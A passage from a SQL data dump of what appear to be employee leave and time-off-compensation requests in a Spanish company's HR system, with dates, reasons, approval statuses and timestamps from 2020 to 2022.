COMPUTO','2020-09-18',NULL,0,'ACEPTADO','',506,'2020-08-21 19:57:15','2020-08-31 05:32:54'),(579,190,'2020-09-19','DEVOLUCION COMPUTO','2020-09-19',NULL,0,'ACEPTADO','',507,'2020-08-21 19:57:46','2020-08-31 05:33:59'),(580,190,'2020-09-20','DEVOLUCION COMPUTO','2020-09-20',NULL,0,'ACEPTADO','',508,'2020-08-21 19:58:45','2020-08-31 05:34:37'),(581,276,'2020-09-17','DEVOLUCION COMPUTO','2020-09-17',NULL,0,'ACEPTADO',NULL,509,'2020-08-29 13:29:20','2020-08-30 07:18:01'),(582,358,'2020-09-14','DEVOLUCION COMPUTO','2020-09-14',NULL,0,'PENDIENTE',NULL,510,'2020-09-04 06:51:39','2020-09-04 06:51:39'),(583,358,'2020-09-20','DEVOLUCION COMPUTO','2020-09-20',NULL,0,'PENDIENTE',NULL,511,'2020-09-04 06:53:43','2020-09-04 06:53:43'),(584,150,'2020-09-16','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,512,'2020-09-07 08:00:43','2020-09-07 08:00:43'),(590,367,'2020-10-12','dia devac que le debe la empresa.','2020-10-12','',0,'ACEPTADO','',513,'2020-09-07 13:21:00','2020-10-02 07:38:15'),(591,367,'2020-10-10','.Dia de VAC que le debe la empresa.',NULL,'',0,'ACEPTADO','',NULL,'2020-09-14 08:04:12','2020-10-02 07:39:29'),(592,367,'2020-10-11','dia de vac que le debe la empresa',NULL,'',0,'ACEPTADO','',NULL,'2020-09-14 13:20:09','2020-10-02 07:39:09'),(593,371,'2020-10-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,514,'2020-09-22 06:24:52','2020-09-22 06:24:52'),(594,217,'2020-10-03','necesidades personales, prueba medica a la hija',NULL,'',1,'ACEPTADO','',NULL,'2020-10-05 14:54:02','2021-11-15 11:32:53'),(595,363,'2020-11-14','DEVOLUCION COMPUTO','2020-11-14',NULL,0,'ACEPTADO','',515,'2020-10-15 05:23:59','2020-11-25 07:04:33'),(596,363,'2020-11-15','DEVOLUCION COMPUTO','2020-11-15',NULL,0,'ACEPTADO','',516,'2020-10-15 05:24:25','2020-11-25 07:05:02'),(599,363,'2020-12-19','DEVOLUCION COMPUTO','2020-12-19',NULL,0,'PENDIENTE',NULL,519,'2020-10-15 05:25:48','2020-10-15 05:25:48'),(600,363,'2020-12-20','DEVOLUCION COMPUTO','2020-12-20',NULL,0,'PENDIENTE',NULL,520,'2020-10-15 05:26:22','2020-10-15 05:26:22'),(601,363,'2020-11-16','DEVOLUCION COMPUTO','2020-11-16',NULL,0,'ACEPTADO','',521,'2020-10-15 05:28:34','2020-11-25 07:05:18'),(602,245,'2020-11-21','DEVOLUCION COMPUTO','2020-11-21',NULL,0,'PENDIENTE',NULL,522,'2020-10-18 13:58:55','2020-10-18 13:58:55'),(603,245,'2020-11-22','DEVOLUCION COMPUTO','2020-11-22',NULL,0,'PENDIENTE',NULL,523,'2020-10-18 14:00:37','2020-10-18 14:00:37'),(604,245,'2020-11-23','DEVOLUCION COMPUTO','2020-11-23',NULL,0,'PENDIENTE',NULL,524,'2020-10-18 14:01:48','2020-10-18 14:01:48'),(605,245,'2020-11-24','DEVOLUCION COMPUTO','2020-11-24',NULL,0,'PENDIENTE',NULL,525,'2020-10-18 14:02:38','2020-10-18 14:02:38'),(607,366,'2020-10-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,527,'2020-10-20 11:49:14','2020-10-20 11:49:14'),(608,382,'2020-11-06','DEVOLUCION COMPUTO','2020-11-06',NULL,0,'ACEPTADO','',528,'2020-10-24 10:40:21','2020-10-26 09:19:11'),(609,382,'2020-11-27','DEVOLUCION COMPUTO','2020-11-27',NULL,0,'PENDIENTE',NULL,529,'2020-11-03 14:00:42','2020-11-03 14:00:42'),(611,382,'2020-12-06','DEVOLUCION COMPUTO','2020-12-06',NULL,0,'PENDIENTE',NULL,531,'2020-11-03 14:01:29','2020-11-03 14:01:29'),(613,382,'2020-12-05','DEVOLUCION COMPUTO','2020-12-05',NULL,0,'PENDIENTE',NULL,533,'2020-11-03 14:02:12','2020-11-03 14:02:12'),(614,197,'2020-12-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,534,'2020-11-10 13:33:59','2020-11-10 13:33:59'),(615,197,'2020-12-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,535,'2020-11-10 13:33:59','2020-11-10 13:33:59'),(616,363,'2020-12-05','DEVOLUCION COMPUTO','2020-12-05',NULL,0,'ACEPTADO','',536,'2020-11-21 06:16:11','2020-11-25 07:05:45'),(617,363,'2020-12-06','DEVOLUCION COMPUTO','2020-12-06',NULL,0,'ACEPTADO','',537,'2020-11-21 06:16:39','2020-11-25 07:05:58'),(618,277,'2020-12-11','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,538,'2020-11-25 06:59:59','2020-11-25 06:59:59'),(619,382,'2020-12-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,539,'2020-11-25 07:31:55','2020-11-25 07:31:55'),(620,382,'2020-12-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,540,'2020-11-25 07:32:23','2020-11-25 07:32:23'),(622,171,'2020-12-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,541,'2020-12-18 08:00:37','2020-12-18 08:00:37'),(623,418,'2021-02-10','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,542,'2021-02-05 12:12:49','2021-02-05 12:12:49'),(624,239,'2021-08-10','DEVOLUCION COMPUTO','2021-08-10',NULL,0,'ACEPTADO',NULL,543,'2021-02-21 08:37:15','2021-02-22 06:50:08'),(625,239,'2021-08-11','DEVOLUCION COMPUTO','2021-08-11',NULL,0,'ACEPTADO',NULL,544,'2021-02-21 08:37:50','2021-02-22 06:49:59'),(626,239,'2021-08-12','DEVOLUCION COMPUTO','2021-08-12',NULL,0,'ACEPTADO',NULL,545,'2021-02-21 08:38:14','2021-02-22 06:49:54'),(627,367,'2021-03-11','DEVOLUCION COMPUTO','2021-03-11',NULL,0,'ACEPTADO',NULL,546,'2021-03-02 15:11:38','2021-03-03 07:31:53'),(629,413,'2021-07-05','DEVOLUCION COMPUTO','2021-07-05','',0,'ACEPTADO','',547,'2021-03-12 00:11:49','2021-04-26 17:46:09'),(630,413,'2021-07-06','DEVOLUCION COMPUTO','2021-07-06',NULL,0,'ACEPTADO','',548,'2021-03-12 00:12:18','2021-04-26 17:46:38'),(631,413,'2021-07-07','DEVOLUCION COMPUTO','2021-07-07',NULL,0,'ACEPTADO','',549,'2021-03-12 00:12:41','2021-04-26 17:46:49'),(632,413,'2021-07-08','DEVOLUCION COMPUTO','2021-07-08',NULL,0,'ACEPTADO','',550,'2021-03-12 00:13:11','2021-04-26 17:47:01'),(633,413,'2021-07-09','DEVOLUCION COMPUTO','2021-07-09',NULL,0,'ACEPTADO','',551,'2021-03-12 00:13:31','2021-04-26 17:47:15'),(634,418,'2021-03-31','DEVOLUCION COMPUTO','2021-03-31',NULL,0,'ACEPTADO',NULL,552,'2021-03-15 07:50:29','2021-03-15 07:52:42'),(635,413,'2021-08-11','DEVOLUCION COMPUTO','2021-08-05','',0,'ACEPTADO','',553,'2021-04-26 14:53:17','2021-04-26 17:48:39'),(636,413,'2021-08-06','DEVOLUCION COMPUTO','2021-08-13','',0,'ACEPTADO','',554,'2021-04-26 14:53:52','2021-04-26 17:50:03'),(637,413,'2021-08-12','DEVOLUCION COMPUTO','2021-08-12','',0,'ACEPTADO','',555,'2021-04-26 14:54:39','2021-04-26 17:49:31'),(638,380,'2021-08-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,556,'2021-04-26 18:11:54','2021-04-26 18:11:54'),(639,380,'2021-08-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,557,'2021-04-26 18:12:19','2021-04-26 18:12:19'),(642,292,'2021-08-20','DEVOLUCION COMPUTO','2021-08-20',NULL,0,'ACEPTADO',NULL,560,'2021-04-28 11:28:15','2021-04-29 05:55:55'),(643,292,'2021-08-21','DEVOLUCION COMPUTO','2021-08-21',NULL,0,'ACEPTADO',NULL,561,'2021-04-28 11:28:49','2021-04-29 05:56:04'),(644,292,'2021-08-22','DEVOLUCION COMPUTO','2021-08-22',NULL,0,'ACEPTADO',NULL,562,'2021-04-28 11:29:28','2021-04-29 05:56:57'),(645,292,'2021-08-23','DEVOLUCION COMPUTO','2021-08-23',NULL,0,'ACEPTADO',NULL,563,'2021-04-28 11:30:12','2021-04-29 05:57:17'),(646,418,'2021-04-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,564,'2021-04-30 05:21:28','2021-04-30 05:21:28'),(647,367,'2021-07-23','DEVOLUCION COMPUTO','2021-07-23',NULL,0,'ACEPTADO','',565,'2021-05-02 20:31:57','2021-05-03 06:30:18'),(648,367,'2021-07-24','DEVOLUCION COMPUTO','2021-07-24',NULL,0,'ACEPTADO','',566,'2021-05-02 20:32:24','2021-05-03 06:30:24'),(649,367,'2021-07-25','DEVOLUCION COMPUTO','2021-07-25',NULL,0,'ACEPTADO','',567,'2021-05-02 20:32:44','2021-05-03 06:30:35'),(653,253,'2021-08-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,571,'2021-05-04 10:03:44','2021-05-04 10:03:44'),(656,247,'2021-08-17','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,574,'2021-05-05 09:35:08','2021-05-05 09:35:08'),(657,247,'2021-08-18','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,575,'2021-05-05 09:35:08','2021-05-05 09:35:08'),(658,402,'2021-08-14','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,576,'2021-05-06 08:30:01','2021-05-06 08:30:01'),(659,402,'2021-08-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,577,'2021-05-06 08:30:17','2021-05-06 08:30:17'),(660,276,'2021-05-13','solicitud ',NULL,'',1,'ACEPTADO','',NULL,'2021-05-06 10:03:25','2021-05-06 10:03:54'),(661,190,'2021-06-14','DEVOLUCION COMPUTO','2021-06-14',NULL,0,'ACEPTADO',NULL,578,'2021-05-10 03:45:35','2021-05-10 05:25:35'),(662,291,'2021-07-01','DEVOLUCION COMPUTO','2021-07-01',NULL,0,'ACEPTADO',NULL,579,'2021-05-10 22:21:42','2021-05-11 06:33:25'),(663,291,'2021-07-06','DEVOLUCION COMPUTO','2021-07-06',NULL,0,'ACEPTADO','',580,'2021-05-10 22:26:44','2021-05-12 10:58:45'),(664,291,'2021-07-07','DEVOLUCION COMPUTO','2021-07-07',NULL,0,'ACEPTADO','',581,'2021-05-10 22:27:16','2021-05-12 10:58:51'),(665,241,'2021-09-23','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,582,'2021-05-13 06:56:47','2021-05-13 06:56:47'),(666,241,'2021-09-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,583,'2021-05-13 06:56:47','2021-05-13 06:56:47'),(667,241,'2021-09-25','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,584,'2021-05-13 06:56:47','2021-05-13 06:56:47'),(668,241,'2021-09-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,585,'2021-05-13 06:57:02','2021-05-13 06:57:02'),(669,241,'2021-09-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,586,'2021-05-13 06:57:02','2021-05-13 06:57:02'),(670,241,'2021-09-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,587,'2021-05-13 06:57:02','2021-05-13 06:57:02'),(675,379,'2021-06-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,588,'2021-05-17 06:27:32','2021-05-17 06:27:32'),(676,379,'2021-06-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,589,'2021-05-17 06:27:50','2021-05-17 06:27:50'),(677,379,'2021-07-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,590,'2021-05-17 06:34:24','2021-05-17 06:34:24'),(678,379,'2021-07-16','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,591,'2021-05-17 06:34:49','2021-05-17 06:34:49'),(679,292,'2021-08-25','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,592,'2021-05-20 04:52:02','2021-05-20 04:52:02'),(688,367,'2021-07-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,597,'2021-05-28 10:33:57','2021-05-28 10:33:57'),(689,239,'2021-06-21','DEVOLUCION COMPUTO','2021-06-21',NULL,0,'ACEPTADO',NULL,598,'2021-05-31 22:52:28','2021-06-01 06:30:59'),(690,239,'2021-06-22','DEVOLUCION COMPUTO','2021-06-22',NULL,0,'ACEPTADO',NULL,599,'2021-05-31 22:53:11','2021-06-01 06:32:51'),(691,239,'2021-06-23','DEVOLUCION COMPUTO','2021-06-23',NULL,0,'ACEPTADO',NULL,600,'2021-05-31 22:53:44','2021-06-01 06:32:32'),(692,239,'2021-06-24','DEVOLUCION COMPUTO','2021-06-24',NULL,0,'ACEPTADO',NULL,601,'2021-05-31 22:54:28','2021-06-01 06:32:16'),(693,239,'2021-06-29','DEVOLUCION COMPUTO','2021-06-29',NULL,0,'ACEPTADO',NULL,602,'2021-05-31 22:55:09','2021-06-01 06:31:54'),(694,429,'2021-07-08','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,603,'2021-06-11 06:41:30','2021-06-11 06:41:30'),(695,418,'2021-08-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,605,'2021-06-11 08:22:08','2021-06-11 08:22:08'),(696,291,'2021-08-31','DEVOLUCION COMPUTO','2021-08-31',NULL,0,'ACEPTADO',NULL,606,'2021-06-23 12:35:06','2021-06-24 05:52:20'),(697,407,'2021-06-26','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,607,'2021-06-25 06:59:58','2021-06-25 06:59:58'),(698,407,'2021-06-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,608,'2021-06-25 07:00:07','2021-06-25 07:00:07'),(699,407,'2021-06-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,609,'2021-06-25 07:00:21','2021-06-25 07:00:21'),(700,407,'2021-06-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,610,'2021-06-25 07:00:28','2021-06-25 07:00:28'),(701,407,'2021-06-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,611,'2021-06-25 07:00:38','2021-06-25 07:00:38'),(702,407,'2021-07-01','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,612,'2021-06-25 07:00:48','2021-06-25 07:00:48'),(703,181,'2021-07-26','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,613,'2021-06-25 07:13:59','2021-06-25 07:13:59'),(704,418,'2021-08-11','Motivos personales, devolucion de dia pedido por la empresa 28/05',NULL,'',0,'ACEPTADO','',NULL,'2021-06-29 05:09:21','2022-06-15 07:06:40'),(705,197,'2021-09-11','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,614,'2021-07-01 09:37:02','2021-07-01 09:37:02'),(706,197,'2021-09-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,615,'2021-07-01 09:37:02','2021-07-01 09:37:02'),(707,197,'2021-09-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,616,'2021-07-01 09:37:02','2021-07-01 09:37:02'),(709,422,'2021-07-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,617,'2021-07-08 09:30:02','2021-07-08 09:30:02'),(710,229,'2021-09-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,618,'2021-07-22 15:39:31','2021-07-22 15:39:31'),(711,229,'2021-09-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,619,'2021-07-22 15:39:42','2021-07-22 15:39:42'),(712,229,'2021-09-23','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,620,'2021-07-22 15:39:51','2021-07-22 15:39:51'),(713,229,'2021-09-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,621,'2021-07-22 15:40:29','2021-07-22 15:40:29'),(714,229,'2021-09-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,622,'2021-07-22 15:41:11','2021-07-22 15:41:11'),(715,229,'2021-09-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,623,'2021-07-22 15:41:53','2021-07-22 15:41:53'),(716,229,'2021-09-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,624,'2021-07-22 15:42:11','2021-07-22 15:42:11'),(717,244,'2021-09-07','DEVOLUCION COMPUTO','2021-09-07',NULL,0,'ACEPTADO','',625,'2021-07-26 19:56:03','2021-07-27 05:11:50'),(718,244,'2021-09-08','DEVOLUCION COMPUTO','2021-09-08',NULL,0,'ACEPTADO','',626,'2021-07-26 19:56:57','2021-07-27 05:11:55'),(719,244,'2021-09-09','DEVOLUCION COMPUTO','2021-09-09',NULL,0,'ACEPTADO','',627,'2021-07-26 19:58:15','2021-07-27 05:12:06'),(720,244,'2021-09-10','DEVOLUCION COMPUTO','2021-09-10',NULL,0,'ACEPTADO','',628,'2021-07-26 20:03:14','2021-07-27 05:12:11'),(721,371,'2021-08-20','Solicitud Personal','2021-09-23','licencia Jon Sanz',0,'PENDIENTE',NULL,NULL,'2021-08-12 09:39:39','2021-09-13 12:10:51'),(722,379,'2021-09-02','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,629,'2021-08-20 09:26:02','2021-08-20 09:26:02'),(723,367,'2021-12-06','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,630,'2021-08-20 11:38:44','2021-08-20 11:38:44'),(724,367,'2021-12-07','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,631,'2021-08-20 11:39:09','2021-08-20 11:39:09'),(725,425,'2021-10-14','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,632,'2021-09-16 06:16:02','2021-09-16 06:16:02'),(726,425,'2021-10-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,633,'2021-09-16 06:16:22','2021-09-16 06:16:22'),(727,425,'2021-10-16','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,634,'2021-09-16 06:16:43','2021-09-16 06:16:43'),(728,407,'2021-09-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,635,'2021-09-16 09:30:23','2021-09-16 09:30:23'),(729,291,'2021-10-25','DEVOLUCION COMPUTO','2021-10-25',NULL,0,'ACEPTADO',NULL,636,'2021-09-23 18:46:29','2021-09-24 05:49:40'),(730,202,'2021-09-27','Necesidades personales','2022-07-12','curso extincion de incendios',0,'PENDIENTE',NULL,NULL,'2021-09-27 15:06:04','2022-05-24 12:58:45'),(731,202,'2021-09-28','necesidades personales','2022-11-24','licencias sindicales',0,'ACEPTADO','',NULL,'2021-09-27 15:06:32','2022-11-17 14:43:02'),(732,89,'2021-12-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,637,'2021-10-04 14:44:09','2021-10-04 14:44:09'),(733,241,'2021-10-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,638,'2021-10-05 10:33:51','2021-10-05 10:33:51'),(734,229,'2021-11-01','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,639,'2021-10-07 12:17:54','2021-10-07 12:17:54'),(735,207,'2021-11-08','DEVOLUCION COMPUTO','2021-11-08',NULL,0,'ACEPTADO',NULL,640,'2021-10-12 13:03:28','2021-10-13 05:35:45'),(736,207,'2021-11-09','DEVOLUCION COMPUTO','2021-11-09',NULL,0,'ACEPTADO',NULL,641,'2021-10-12 13:04:18','2021-10-13 05:35:51'),(737,207,'2021-11-10','DEVOLUCION COMPUTO','2021-11-10',NULL,0,'ACEPTADO',NULL,642,'2021-10-12 13:04:46','2021-10-13 05:36:00'),(738,197,'2021-12-21','DEVOLUCION COMPUTO','2021-12-21',NULL,0,'ACEPTADO',NULL,643,'2021-10-12 17:17:22','2021-10-13 05:33:53'),(739,422,'2021-10-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,644,'2021-10-13 10:42:28','2021-10-13 10:42:28'),(740,380,'2021-11-10','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,645,'2021-10-26 12:25:58','2021-10-26 12:25:58'),(741,380,'2021-11-11','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,646,'2021-10-26 12:26:18','2021-10-26 12:26:18'),(742,422,'2021-11-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,647,'2021-10-29 10:10:45','2021-10-29 10:10:45'),(743,422,'2021-11-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,648,'2021-10-29 10:11:02','2021-10-29 10:11:02'),(744,428,'2021-11-16','DEVOLUCION COMPUTO','2021-11-16',NULL,0,'ACEPTADO',NULL,649,'2021-11-08 09:57:38','2021-11-08 10:06:47'),(745,407,'2021-11-27','DEVOLUCION COMPUTO','2021-11-27',NULL,0,'ACEPTADO','',650,'2021-11-12 10:28:38','2021-11-15 11:34:51'),(746,407,'2021-11-28','DEVOLUCION COMPUTO','2021-11-28','',0,'ACEPTADO','',651,'2021-11-12 10:29:17','2021-11-15 11:35:14'),(747,159,'2021-12-17','DEVOLUCION COMPUTO','2021-12-17',NULL,0,'ACEPTADO',NULL,652,'2021-11-26 10:51:38','2021-11-26 10:55:37'),(750,407,'2021-12-31','DEVOLUCION COMPUTO','2021-12-31',NULL,0,'ACEPTADO','',653,'2021-12-09 10:37:18','2021-12-21 10:43:29'),(751,394,'2022-04-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,654,'2022-01-31 07:35:29','2022-01-31 07:35:29'),(752,394,'2022-04-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,655,'2022-01-31 07:35:58','2022-01-31 07:35:58'),(753,291,'2022-02-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,656,'2022-02-14 07:46:51','2022-02-14 07:46:51'),(754,196,'2022-04-21','DEVOLUCION COMPUTO','2022-04-21',NULL,0,'ACEPTADO',NULL,657,'2022-02-20 16:29:04','2022-02-21 05:57:57'),(756,196,'2022-07-11','DEVOLUCION COMPUTO','2022-07-11',NULL,0,'ACEPTADO','',659,'2022-03-03 19:09:38','2022-03-08 09:01:07'),(757,196,'2022-07-12','DEVOLUCION COMPUTO','2022-07-12',NULL,0,'ACEPTADO',NULL,660,'2022-03-03 19:10:10','2022-03-04 05:48:03'),(758,196,'2022-07-13','DEVOLUCION COMPUTO','2022-07-13',NULL,0,'ACEPTADO',NULL,661,'2022-03-03 19:10:38','2022-03-04 05:47:54'),(759,196,'2022-07-14','DEVOLUCION COMPUTO','2022-07-14',NULL,0,'ACEPTADO',NULL,662,'2022-03-03 19:11:13','2022-03-04 05:47:44'),(760,455,'2022-07-06','DEVOLUCION COMPUTO','2022-07-06',NULL,0,'ACEPTADO',NULL,663,'2022-03-12 13:38:35','2022-03-14 06:11:39'),(761,455,'2022-07-07','DEVOLUCION COMPUTO','2022-07-07',NULL,0,'ACEPTADO',NULL,664,'2022-03-12 13:39:01','2022-03-14 06:11:49'),(762,455,'2022-07-08','DEVOLUCION COMPUTO','2022-07-08',NULL,0,'ACEPTADO',NULL,665,'2022-03-12 13:39:41','2022-03-14 06:11:57'),(763,455,'2022-07-09','DEVOLUCION COMPUTO','2022-07-09',NULL,0,'ACEPTADO',NULL,666,'2022-03-12 13:40:04','2022-03-14 06:12:07'),(764,455,'2022-07-10','DEVOLUCION COMPUTO','2022-07-10',NULL,0,'ACEPTADO',NULL,667,'2022-03-12 13:40:35','2022-03-14 06:12:16'),(766,197,'2022-08-15','DEVOLUCION COMPUTO','2022-08-15',NULL,0,'ACEPTADO',NULL,669,'2022-03-16 11:20:01','2022-03-17 07:56:47'),(767,196,'2022-08-12','DEVOLUCION COMPUTO','2022-08-12',NULL,0,'ACEPTADO','',670,'2022-03-17 12:51:38','2022-03-18 06:26:44'),(768,196,'2022-07-19','DEVOLUCION COMPUTO','2022-07-19','',0,'ACEPTADO',NULL,671,'2022-03-18 06:28:15','2022-03-18 07:14:13'),(769,451,'2022-08-02','DEVOLUCION COMPUTO','2022-08-02',NULL,0,'ACEPTADO',NULL,672,'2022-03-18 10:21:58','2022-03-18 10:41:40'),(770,451,'2022-08-03','DEVOLUCION COMPUTO','2022-08-03',NULL,0,'ACEPTADO',NULL,673,'2022-03-18 10:22:43','2022-03-18 10:42:09'),(771,451,'2022-08-04','DEVOLUCION COMPUTO','2022-08-04',NULL,0,'ACEPTADO','',674,'2022-03-18 10:23:00','2022-03-18 10:46:25'),(772,451,'2022-08-28','DEVOLUCION COMPUTO','2022-08-28',NULL,0,'ACEPTADO',NULL,675,'2022-03-18 10:25:25','2022-03-18 10:45:43'),(774,167,'2022-08-15','DEVOLUCION COMPUTO','2022-08-15',NULL,0,'PENDIENTE',NULL,677,'2022-03-23 08:14:17','2022-03-23 08:14:17'),(775,457,'2022-09-15','DEVOLUCION COMPUTO','2022-09-15',NULL,0,'ACEPTADO',NULL,678,'2022-04-02 11:40:13','2022-04-04 05:17:15'),(776,457,'2022-09-16','DEVOLUCION COMPUTO','2022-09-16',NULL,0,'ACEPTADO',NULL,679,'2022-04-02 11:40:45','2022-04-04 05:17:22'),(777,457,'2022-09-17','DEVOLUCION COMPUTO','2022-09-17',NULL,0,'ACEPTADO',NULL,680,'2022-04-02 11:41:12','2022-04-04 05:17:30'),(778,457,'2022-09-18','DEVOLUCION COMPUTO','2022-09-18',NULL,0,'ACEPTADO',NULL,681,'2022-04-02 11:42:02','2022-04-04 05:17:39'),(779,457,'2022-09-19','DEVOLUCION COMPUTO','2022-09-19',NULL,0,'ACEPTADO',NULL,682,'2022-04-02 11:42:26','2022-04-04 05:17:43'),(783,450,'2022-07-26','DEVOLUCION COMPUTO','2022-07-26',NULL,0,'ACEPTADO',NULL,683,'2022-04-10 15:58:18','2022-04-11 05:02:05'),(784,450,'2022-07-27','DEVOLUCION COMPUTO','2022-07-27',NULL,0,'ACEPTADO',NULL,684,'2022-04-10 15:59:01','2022-04-11 05:02:12'),(785,450,'2022-07-28','DEVOLUCION COMPUTO','2022-07-28',NULL,0,'ACEPTADO',NULL,685,'2022-04-10 15:59:36','2022-04-11 05:02:18'),(786,450,'2022-05-09','DEVOLUCION COMPUTO','2022-05-09',NULL,0,'ACEPTADO',NULL,686,'2022-04-10 20:15:59','2022-04-11 05:01:09'),(787,244,'2022-06-06','DEVOLUCION COMPUTO','2022-06-06',NULL,0,'ACEPTADO',NULL,687,'2022-04-29 15:20:59','2022-05-02 06:09:15'),(788,244,'2022-06-07','DEVOLUCION COMPUTO','2022-06-07',NULL,0,'ACEPTADO',NULL,688,'2022-04-29 15:21:48','2022-05-02 06:09:54'),(789,418,'2022-08-18','necesidades personales','2022-06-11','solicitud de la empresa pГІr IT de Alberto Sanchez',0,'ACEPTADO','',NULL,'2022-05-26 16:50:54','2022-06-15 07:08:39'),(791,449,'2022-08-03','DEVOLUCION COMPUTO','2022-08-03',NULL,0,'ACEPTADO',NULL,690,'2022-07-22 20:42:01','2022-07-26 05:05:11'),(792,448,'2022-08-06','DEVOLUCION COMPUTO','2022-08-06',NULL,0,'ACEPTADO',NULL,691,'2022-07-28 07:01:32','2022-07-28 07:38:33'),(793,448,'2022-08-07','DEVOLUCION COMPUTO','2022-08-07',NULL,0,'ACEPTADO',NULL,692,'2022-07-28 07:02:00','2022-07-28 07:38:39'),(794,159,'2022-10-11','DEVOLUCION COMPUTO','2022-10-11',NULL,0,'ACEPTADO',NULL,693,'2022-08-28 15:16:16','2022-08-29 07:11:16'),(795,159,'2022-10-12','DEVOLUCION COMPUTO','2022-10-12',NULL,0,'ACEPTADO',NULL,694,'2022-08-28 15:17:44','2022-08-29 07:12:40'),(796,159,'2022-10-13','DEVOLUCION COMPUTO','2022-10-13',NULL,0,'ACEPTADO',NULL,695,'2022-08-28 15:18:57','2022-08-29 07:13:08'),(797,159,'2022-12-23','DEVOLUCION COMPUTO','2022-12-23',NULL,0,'ACEPTADO',NULL,696,'2022-08-28 15:20:16','2022-08-29 07:14:52'),(798,159,'2023-01-05','DEVOLUCION COMPUTO','2023-01-05',NULL,0,'ACEPTADO',NULL,697,'2022-08-28 15:22:18','2022-08-29 07:15:33'),(799,197,'2022-09-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,698,'2022-08-30 11:41:05','2022-08-30 11:41:05'),(800,197,'2022-09-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,699,'2022-08-30 11:41:28','2022-08-30 11:41:28'),(801,449,'2022-09-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,700,'2022-09-01 09:21:42','2022-09-01 